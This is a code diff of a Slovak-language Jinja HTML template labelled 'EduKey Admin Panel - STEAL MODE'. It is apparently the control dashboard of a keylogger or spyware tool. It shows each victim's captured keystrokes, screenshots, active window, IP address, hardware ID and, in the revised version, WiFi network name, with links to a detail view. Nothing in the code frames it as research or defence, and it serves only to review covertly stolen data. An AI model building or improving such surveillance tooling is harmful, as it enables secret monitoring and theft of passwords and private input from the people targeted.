@@ -1,136 +1,80 @@
 <!DOCTYPE html>
 <html lang="sk">
 <head>
-<meta charset="UTF-8" />
-<title>EduKey Admin Panel - STEAL MODE</title>
-<style>
-  /* Dark hacker vibe */
-  body {
-    background-color: #0f0f0f;
-    color: #00ff00;
-    font-family: 'Courier New', Courier, monospace;
-    margin: 0; padding: 20px;
-  }
-  h2 {
-    text-align: center;
-    font-size: 2.5em;
-    text-shadow: 0 0 5px #00ff00, 0 0 10px #00ff00;
-  }
-  table {
-    border-collapse: collapse;
-    width: 100%;
-    border: 1px solid #00ff00;
-    box-shadow: 0 0 15px #00ff00aa;
-  }
-  th, td {
-    border: 1px solid #00ff00;
-    padding: 8px;
-    text-align: left;
-    vertical-align: middle;
-  }
-  th {
-    background: #003300;
-    text-transform: uppercase;
-    letter-spacing: 1px;
-  }
-  pre {
-    white-space: pre-wrap;
-    word-wrap: break-word;
-    font-size: 0.9em;
-    color: #0f0;
-  }
-  img {
-    max-height: 120px;
-    border: 1px solid #00ff00;
-    box-shadow: 0 0 8px #00ff00;
-  }
-  tr:hover {
-    background-color: #002200;
-    cursor: pointer;
-  }
-  /* Glitch effect on keys */
-  td pre {
-    position: relative;
-    animation: glitch 2s infinite;
-  }
-  @keyframes glitch {
-    0% {
-      text-shadow:
-        2px 0 red,
-        -2px 0 cyan;
-    }
-    20% {
-      text-shadow:
-        -2px 0 red,
-        2px 0 cyan;
-    }
-    40% {
-      text-shadow:
-        2px 0 red,
-        -2px 0 cyan;
-    }
-    60% {
-      text-shadow:
-        -2px 0 red,
-        2px 0 cyan;
-    }
-    80% {
-      text-shadow:
-        2px 0 red,
-        -2px 0 cyan;
-    }
-    100% {
-      text-shadow:
-        none;
-    }
-  }
-  /* Scroll bar for large data */
-  tbody {
-    display: block;
-    max-height: 600px;
-    overflow-y: auto;
-  }
-  thead, tbody tr {
-    display: table;
-    width: 100%;
-    table-layout: fixed;
-  }
-</style>
+    <meta charset="UTF-8" />
+    <title>EduKey Admin Panel - STEAL MODE</title>
+    <style>
+        /* Dark hacker vibe */
+        body { background-color: #0f0f0f; color: #00ff00; font-family: 'Courier New', Courier, monospace; margin: 0; padding: 20px; }
+        h2 { text-align: center; font-size: 2.5em; text-shadow: 0 0 5px #00ff00, 0 0 10px #00ff00; margin-bottom: 20px; }
+        table { border-collapse: collapse; width: 100%; border: 1px solid #00ff00; box-shadow: 0 0 15px #00ff00aa; }
+        th, td { border: 1px solid #00ff00; padding: 10px; text-align: left; vertical-align: top; } /* Zmena na vertical-align: top pre lepšie zarovnanie pri viacriadkovom obsahu */
+        th { background: #003300; text-transform: uppercase; letter-spacing: 1px; }
+        pre { white-space: pre-wrap; word-wrap: break-word; font-size: 0.9em; color: #0f0; max-height: 100px; overflow-y: auto; }
+        img { max-height: 120px; border: 1px solid #00ff00; box-shadow: 0 0 8px #00ff00; cursor: pointer; } /* Pridaný cursor: pointer */
+        tr:hover { background-color: #002200; }
+        .no-data { color: #888; font-style: italic; }
+
+        /* Glitch effect on keys */
+        td pre { position: relative; animation: glitch 2s infinite; }
+        @keyframes glitch { 0% { text-shadow: 2px 0 red, -2px 0 cyan; } 20% { text-shadow: -2px 0 red, 2px 0 cyan; } 40% { text-shadow: 2px 0 red, -2px 0 cyan; } 60% { text-shadow: -2px 0 red, 2px 0 cyan; } 80% { text-shadow: 2px 0 red, -2px 0 cyan; } 100% { text-shadow: none; } }
+
+        /* Scroll bar for large data */
+        tbody { display: block; max-height: 70vh; overflow-y: auto; }
+        thead, tbody tr { display: table; width: 100%; table-layout: fixed; }
+        th:nth-child(6), td:nth-child(6) { width: 25%; } /* Širší stĺpec pre klávesy */
+        th:nth-child(7), td:nth-child(7) { width: 10%; } /* Širší stĺpec pre screenshot */
+        th:nth-child(8), td:nth-child(8) { width: 10%; } /* Stĺpec pre akcie */
+    </style>
 </head>
 <body>
-  <h2>EDUKEY 2025 - STEAL MODE</h2>
-  <table>
-    <thead>
-      <tr>
-        <th>Čas</th>
-        <th>User</th>
-        <th>HWID</th>
-        <th>IP</th>
-        <th>Aktívne okno</th>
-        <th>Stlačené klávesy</th>
-        <th>Screenshot</th>
-      </tr>
-    </thead>
-    <tbody>
-      {% for entry in data %}
-      <tr>
-        <td>{{ entry.timestamp }}</td>
-        <td>{{ entry.user_id }}</td>
-        <td>{{ entry.hwid }}</td>
-        <td>{{ entry.ip_address }}</td>
-        <td>{{ entry.active_window }}</td>
-        <td><pre>{{ entry.keys }}</pre></td>
-        <td>
-          {% if entry.screenshot %}
-            <img src="data:image/png;base64,{{ entry.screenshot }}" alt="Screenshot" />
-          {% else %}
-            Žiadny
-          {% endif %}
-        </td>
-      </tr>
-      {% endfor %}
-    </tbody>
-  </table>
+    <h2>EDUKEY 2025 - STEAL MODE</h2>
+    <table>
+        <thead>
+            <tr>
+                <th>Čas</th>
+                <th>User</th>
+                <th>HWID</th>
+                <th>IP</th>
+                <th>Aktívne okno</th>
+                <th>WiFi Sieť</th>
+                <th>Stlačené klávesy</th>
+                <th>Screenshot</th>
+                <th>Akcie</th>
+            </tr>
+        </thead>
+        <tbody>
+        {% for entry in data %}
+            <tr>
+                <!-- Kľúčová zmena: 'timestamp' -> 'received_at' a formátovanie času -->
+                <td>{{ entry.received_at[:19].replace('T', ' ') }}</td>
+                <td>{{ entry.user_id }}</td>
+                <td>{{ entry.hwid[:10] }}...</td>
+                <td>{{ entry.ip_address }}</td>
+                <td>{{ entry.active_window or 'N/A' }}</td>
+                
+                <!-- NOVÉ: Zobrazenie WiFi SSID -->
+                <td>{{ entry.wifi_ssid or '<span class="no-data">N/A</span>'|safe }}</td>
+
+                <td><pre>{{ entry.keys or '<span class="no-data">Žiadne</span>'|safe }}</pre></td>
+                <td>
+                    {% if entry.screenshot %}
+                        <!-- Odkaz na detail, kde je väčší screenshot -->
+                        <a href="{{ url_for('detail', index=loop.index0) }}">
+                            <img src="data:image/png;base64,{{ entry.screenshot }}" alt="Screenshot" />
+                        </a>
+                    {% else %}
+                        <span class="no-data">Žiadny</span>
+                    {% endif %}
+                </td>
+                
+                <!-- NOVÉ: Stĺpec pre akcie, najmä pre detail -->
+                <td>
+                    <a href="{{ url_for('detail', index=loop.index0) }}" style="color: #00ff00; text-decoration: underline;">Zobraziť detail</a>
+                </td>
+            </tr>
+        {% endfor %}
+        </tbody>
+    </table>
 </body>
 </html>
-
